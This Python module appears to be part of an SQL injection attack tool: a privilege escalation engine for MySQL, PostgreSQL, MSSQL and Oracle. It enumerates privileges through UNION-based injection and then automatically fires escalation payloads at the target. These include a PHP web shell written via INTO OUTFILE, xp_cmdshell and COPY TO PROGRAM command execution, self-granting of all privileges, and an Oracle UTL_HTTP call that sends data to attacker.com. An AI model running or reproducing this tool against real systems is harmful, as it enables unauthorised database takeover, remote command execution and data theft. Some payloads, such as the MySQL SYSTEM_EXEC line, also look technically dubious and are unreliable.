"""
Privilege Escalation Engine - Database privilege analysis and escalation paths
"""

import re
from typing import Callable, Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class PrivEscResult:
    privilege: str
    current_level: str
    target_level: str
    technique: str
    payload: str
    success: bool
    confidence: float
    risk: str
    prerequisites: List[str]


class PrivilegeEscalation:
    def __init__(self, request_func: Callable = None):
        self.request = request_func

    # ── Privilege Enumeration ─────────────────────────────────────

    def enumerate_privileges(self, dbms: str) -> Dict[str, List[str]]:
        """Enumerate current user privileges"""
        privs = {"current_user": [], "grants": [], "roles": [], "admin": []}

        if "MySQL" in dbms or "MariaDB" in dbms:
            privs = self._mysql_enumerate()
        elif "PostgreSQL" in dbms:
            privs = self._postgres_enumerate()
        elif "MSSQL" in dbms:
            privs = self._mssql_enumerate()
        elif "Oracle" in dbms:
            privs = self._oracle_enumerate()

        return privs

    def _mysql_enumerate(self) -> Dict[str, List[str]]:
        queries = {
            "current_user": "SELECT CURRENT_USER()",
            "user_privs": ("SELECT CONCAT('User: ',User,'@',Host, ' Super:', "
                          "Super_priv, ' File:', File_priv, ' Create:', Create_priv, "
                          "' Drop:', Drop_priv, ' Grant:', Grant_priv, "
                          "' Shutdown:', Shutdown_priv) FROM mysql.user "
                          "WHERE User=CURRENT_USER()"),
            "grants": "SELECT CONCAT(GRANTEE,': ',PRIVILEGE_TYPE) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE GRANTEE=CONCAT('\\'',CURRENT_USER(),'\\'')",
            "is_admin": "SELECT IF(Super_priv='Y','YES','NO') FROM mysql.user WHERE User=CURRENT_USER()",
            "is_dba": "SELECT IF(Super_priv='Y' OR Create_priv='Y','YES','NO') FROM mysql.user WHERE User=CURRENT_USER()",
        }
        return self._exec_queries(queries)

    def _postgres_enumerate(self) -> Dict[str, List[str]]:
        queries = {
            "current_user": "SELECT current_user",
            "roles": "SELECT rolname FROM pg_roles WHERE rolname=current_user",
            "is_super": "SELECT rolsuper FROM pg_roles WHERE rolname=current_user",
            "grants": ("SELECT privilege_type FROM information_schema.role_table_grants "
                      "WHERE grantee=current_user LIMIT 10"),
        }
        return self._exec_queries(queries)

    def _mssql_enumerate(self) -> Dict[str, List[str]]:
        queries = {
            "current_user": "SELECT SYSTEM_USER",
            "is_sysadmin": "SELECT IS_SRVROLEMEMBER('sysadmin')",
            "is_admin": "SELECT IS_SRVROLEMEMBER('admin')",
            "roles": ("SELECT role_principal_id FROM sys.server_role_members "
                     "WHERE member_principal_id=SUSER_ID(SYSTEM_USER)"),
        }
        return self._exec_queries(queries)

    def _oracle_enumerate(self) -> Dict[str, List[str]]:
        queries = {
            "current_user": "SELECT USER FROM DUAL",
            "is_dba": "SELECT COUNT(*) FROM DBA_ROLE_PRIVS WHERE GRANTEE=USER AND GRANTED_ROLE='DBA'",
            "privileges": "SELECT PRIVILEGE FROM SESSION_PRIVS WHERE ROWNUM<20",
        }
        return self._exec_queries(queries)

    def _exec_queries(self, queries: Dict[str, str]) -> Dict[str, List[str]]:
        results = {}
        for key, query in queries.items():
            payload = f"' UNION SELECT {query}-- -"
            try:
                response = self.request(payload)
                items = self._extract_values(response)
                results[key] = items
            except Exception as e:
                results[key] = [f"Error: {e}"]
        return results

    # ── Escalation Paths ─────────────────────────────────────────

    def find_escalation_paths(self, privs: Dict[str, List[str]],
                               dbms: str) -> List[PrivEscResult]:
        """Find privilege escalation paths based on current privileges"""
        paths = []

        if "MySQL" in dbms or "MariaDB" in dbms:
            paths.extend(self._mysql_escalation(privs))
        elif "PostgreSQL" in dbms:
            paths.extend(self._postgres_escalation(privs))
        elif "MSSQL" in dbms:
            paths.extend(self._mssql_escalation(privs))
        elif "Oracle" in dbms:
            paths.extend(self._oracle_escalation(privs))

        return paths

    def _mysql_escalation(self, privs: Dict[str, List[str]]) -> List[PrivEscResult]:
        paths = []

        # Check if FILE privilege available
        has_file = any("File:Y" in p for p in privs.get("user_privs", []))
        if has_file:
            paths.append(PrivEscResult(
                privilege="FILE", current_level="user", target_level="root",
                technique="UDF Injection",
                payload="CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.dll'",
                success=False, confidence=0.6, risk="HIGH",
                prerequisites=["FILE privilege", "MySQL plugin dir writable"]
            ))
            paths.append(PrivEscResult(
                privilege="FILE", current_level="user", target_level="root",
                technique="WebShell via INTO OUTFILE",
                payload="' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'-- -",
                success=False, confidence=0.5, risk="CRITICAL",
                prerequisites=["FILE privilege", "Web dir writable"]
            ))

        # Check if SUPER privilege
        has_super = any("Super:Y" in p for p in privs.get("user_privs", []))
        if has_super:
            paths.append(PrivEscResult(
                privilege="SUPER", current_level="user", target_level="SYSTEM",
                technique="Dynamic SQL Execution",
                payload="' AND DO SYSTEM_EXEC('id')-- -",
                success=False, confidence=0.7, risk="CRITICAL",
                prerequisites=["SUPER privilege"]
            ))

        # Check GRANT privilege
        has_grant = any("Grant:Y" in p for p in privs.get("user_privs", []))
        if has_grant:
            paths.append(PrivEscResult(
                privilege="GRANT", current_level="user", target_level="DBA",
                technique="Grant Privileges to Self",
                payload="' GRANT ALL PRIVILEGES ON *.* TO CURRENT_USER() WITH GRANT OPTION",
                success=False, confidence=0.8, risk="CRITICAL",
                prerequisites=["GRANT privilege"]
            ))

        return paths

    def _postgres_escalation(self, privs: Dict[str, List[str]]) -> List[PrivEscResult]:
        paths = []

        is_super = any("t" in p.lower() for p in privs.get("is_super", []))

        if is_super:
            paths.append(PrivEscResult(
                privilege="SUPERUSER", current_level="user", target_level="SYSTEM",
                technique="COPY PROGRAM",
                payload="'; COPY (SELECT '') TO PROGRAM 'id';-- -",
                success=False, confidence=0.8, risk="CRITICAL",
                prerequisites=["SUPERUSER"]
            ))
            paths.append(PrivEscResult(
                privilege="SUPERUSER", current_level="user", target_level="SYSTEM",
                technique="UDF via LOAD",
                payload="'; CREATE OR REPLACE FUNCTION system(cmd text) RETURNS text AS '/lib/system_cmd.so', 'system_cmd' LANGUAGE C STRICT;-- -",
                success=False, confidence=0.6, risk="CRITICAL",
                prerequisites=["SUPERUSER", "C library access"]
            ))

        return paths

    def _mssql_escalation(self, privs: Dict[str, List[str]]) -> List[PrivEscResult]:
        paths = []

        is_sysadmin = any("1" in p for p in privs.get("is_sysadmin", []))

        if is_sysadmin:
            paths.append(PrivEscResult(
                privilege="sysadmin", current_level="user", target_level="SYSTEM",
                technique="xp_cmdshell",
                payload="'; EXEC xp_cmdshell 'whoami';-- -",
                success=False, confidence=0.9, risk="CRITICAL",
                prerequisites=["sysadmin role"]
            ))
            paths.append(PrivEscResult(
                privilege="sysadmin", current_level="user", target_level="SYSTEM",
                technique="OLE Automation",
                payload="'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;-- -",
                success=False, confidence=0.7, risk="CRITICAL",
                prerequisites=["sysadmin role"]
            ))

        return paths

    def _oracle_escalation(self, privs: Dict[str, List[str]]) -> List[PrivEscResult]:
        paths = []

        is_dba = any("1" in p for p in privs.get("is_dba", []))
        if is_dba:
            paths.append(PrivEscResult(
                privilege="DBA", current_level="user", target_level="SYSTEM",
                technique="Java Stored Procedure",
                payload="' AND CTXSYS.DRITHSX.SN(1, (SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT SYS_CONTEXT('USERENV','IP_ADDRESS') FROM DUAL)))-- -",
                success=False, confidence=0.6, risk="CRITICAL",
                prerequisites=["DBA role", "Java permissions"]
            ))

        return paths

    # ── Automated Escalation ────────────────────────────────────

    def automated_escalation(self, dbms: str) -> List[PrivEscResult]:
        """Automatically enumerate and attempt escalation"""
        privs = self.enumerate_privileges(dbms)

        # Log current privileges
        for key, values in privs.items():
            for v in values:
                if v:
                    print(f"  [{key}] {v}")

        paths = self.find_escalation_paths(privs, dbms)

        # Try each path
        for path in paths:
            if path.payload:
                try:
                    self.request(path.payload)
                    path.success = True
                except Exception:
                    path.success = False

        return paths

    # ── Helper ────────────────────────────────────────────────────

    def _extract_values(self, response: str) -> List[str]:
        values = []
        for line in response.split("\n"):
            line = line.strip()
            if len(line) > 0 and len(line) < 500 and not line.startswith("<"):
                values.append(line)
        return values
